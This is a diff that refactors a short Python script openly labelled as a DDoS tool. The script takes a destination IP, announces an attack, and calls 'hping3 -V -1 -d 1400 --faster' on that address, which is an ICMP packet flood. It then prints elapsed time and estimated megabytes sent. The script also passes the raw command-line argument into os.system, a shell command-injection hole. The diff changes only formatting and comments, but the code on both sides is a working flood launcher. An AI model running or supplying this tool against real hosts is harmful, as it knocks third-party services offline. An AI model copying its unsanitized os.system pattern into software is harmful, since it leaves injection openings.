@@ -1,52 +1,47 @@
-import os
-import sys
-import time
-import datetime
-import signal
+import os, sys, time, datetime, signal
 
-# Global vars
-ERROR_BAD_ARGV_FROM_USER='[DDoS] Error, incorrect arguments: '
-INFO_INIT_1='[DDoS] Starting the attack on the IP '
-INFO_INIT_2='  (Press CTRL+C to Stop it)...'
-INFO_STATS='[DDoS] Coming out, showing stats:'
-ATTACK_FIN='[DDoS] Completed Attack  >:D'
-PKTS_CADENCE=100
-PKTS_LEN=1442
-DATA_LEN=1000000
-DATA_STR='MB'
-INIT_WAIT=4
+# Global parameters
+ERROR_BAD_ARGV_FROM_USER = '[DDoS] Error, incorrect arguments: '
+INFO_INIT_1 = '[DDoS] Starting the attack on the given IP '
+INFO_INIT_2 = '(Press CTRL+C to stop me)...'
+INFO_STATS = '[DDoS] Quitting, showing stats:'
+ATTACK_FIN = '[DDoS] Completed the attack  >:D'
+PKTS_CADENCE = 100
+PKTS_LEN = 1442
+DATA_LEN = 1000000
+DATA_STR = 'MB'
+INIT_WAIT = 4
 
 
-# To get current time  
+# Get the current time 
 def get_str_time():
-	return ('['+(datetime.datetime.now()).strftime('%H:%M:%S')+']')
+	return ('[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']')
 
-# To get time difference
+# Get the time difference based on global variables
 def diff():
 	return (datetime.datetime.now() - time_init)
 
-# To prepare stats
+# Prepare the stats
 def stats():
-	return ('[+] Time Elapsed: '+str(diff()) + '\n' + '[+] Data sent: ' 
-		+ str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' '+DATA_STR+'\n')
+	return ('[+] Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: ' 
+		+ str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')
 
 if __name__ == "__main__":
-	
-	# Check argvs params
+	# Check the passed arguments
 	if len(sys.argv) != 2:
-		print( get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 '+ sys.argv[0] + ' <Destination IP>')
+		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP>')
 		exit(-1)
 	
-	# Stats vars
+	# Initialize status variables
 	time_init = datetime.datetime.now()
 	
-	# Just for telling to the user how to stop the attack
+	# Tell the user how he/she can stop the attack
 	print(INFO_INIT_1 + sys.argv[1] + INFO_INIT_2)
-	os.system('sleep '+str(INIT_WAIT))
+	os.system('sleep ' + str(INIT_WAIT))
 
-	# Main command
+	# Run hping3!
 	os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])	
 
-	# Show stats
-	print('\n\n'+get_str_time() + INFO_STATS + '\n\n'+ stats())
+	# Show the stats
+	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
 	print(get_str_time() + ATTACK_FIN)
